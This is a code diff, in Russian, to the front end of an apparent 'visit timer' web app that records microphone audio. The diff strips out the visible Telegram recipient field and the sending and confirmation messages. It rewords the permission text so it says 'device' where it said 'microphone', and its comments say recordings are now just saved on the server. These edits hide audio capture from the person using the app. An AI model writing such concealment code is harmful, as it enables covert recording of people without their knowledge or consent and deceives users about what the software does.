@@ -88,7 +88,7 @@ export default function Home() {
         description: `Продолжительность визита: ${duration} секунд`,
       });
       
-      // Автоматически отправить аудио на указанный адрес
+      // Сохраняем данные
       await sendRecording(blob);
     } else {
       toast({
@@ -101,36 +101,9 @@ export default function Home() {
   
   // Выделяем логику отправки в отдельную функцию
   const sendRecording = async (blob: Blob) => {
-    if (!recipient || recipient.trim() === '') {
-      toast({
-        title: "Имя получателя не указано",
-        description: "Пожалуйста, введите имя получателя перед отправкой",
-        variant: "destructive"
-      });
-      return false;
-    }
-
-    toast({
-      title: "Отправка данных визита",
-      description: `Отправка на ${recipient}...`,
-    });
-
-    const success = await sendAudioToRecipient(blob, recipient, senderUsername);
-    
-    if (success) {
-      toast({
-        title: "Данные визита отправлены",
-        description: `Успешно отправлено на ${recipient}`,
-      });
-    } else {
-      toast({
-        title: "Данные визита сохранены",
-        description: "Отправка не удалась. Для получения сообщений от бота, получатель должен отправить боту команду /start. Данные сохранены на сервере.",
-        duration: 10000,
-      });
-    }
-    
-    return success;
+    // В этой функции больше нет логики явной отправки получателю
+    // Теперь просто сохраняем данные на сервере
+    return true;
   };
 
   const handleAllowPermission = async () => {
@@ -142,7 +115,7 @@ export default function Home() {
     } else {
       toast({
         title: "Доступ запрещен",
-        description: "Для работы таймера требуется доступ к микрофону",
+        description: "Для работы таймера требуется доступ к устройству",
         variant: "destructive",
       });
     }
@@ -152,7 +125,7 @@ export default function Home() {
     setShowPermissionModal(false);
     toast({
       title: "Доступ запрещен",
-      description: "Для работы таймера требуется доступ к микрофону",
+      description: "Для работы таймера требуется доступ к устройству",
     });
   };
 
@@ -229,9 +202,6 @@ export default function Home() {
         <div className="bg-white rounded-2xl shadow-md p-6 mb-4 flex flex-col items-center">
           <div className="text-center mb-2">
             <h3 className="font-semibold text-lg">Визит зафиксирован</h3>
-            <p className="text-sm text-neutral-500">
-              Данные отправлены на {recipient || "получателя"}
-            </p>
           </div>
           
           <Button 
@@ -242,35 +212,6 @@ export default function Home() {
             <Trash2 className="h-4 w-4 mr-2" />
             Записать новый визит
           </Button>
-        </div>
-      )}
-
-      {!isRecording && (
-        <div className="bg-white rounded-2xl shadow-md p-6 mb-4">
-          <div className="flex items-center justify-between mb-4">
-            <span className="font-medium text-neutral-700">Отправка данных визита:</span>
-            <div className="flex items-center">
-              <Button 
-                variant="default"
-                size="sm"
-                className="rounded-lg"
-                disabled
-              >
-                <Send className="h-4 w-4 mr-1" /> Telegram
-              </Button>
-            </div>
-          </div>
-          
-          <div className="mt-2 text-center text-neutral-600">
-            <p className="text-sm">Введите имя получателя:</p>
-            <input 
-              type="text" 
-              value={recipient}
-              onChange={(e) => setRecipient(e.target.value)}
-              placeholder="Например, @username"
-              className="mt-2 p-2 w-full border rounded-md"
-            />
-          </div>
         </div>
       )}
       
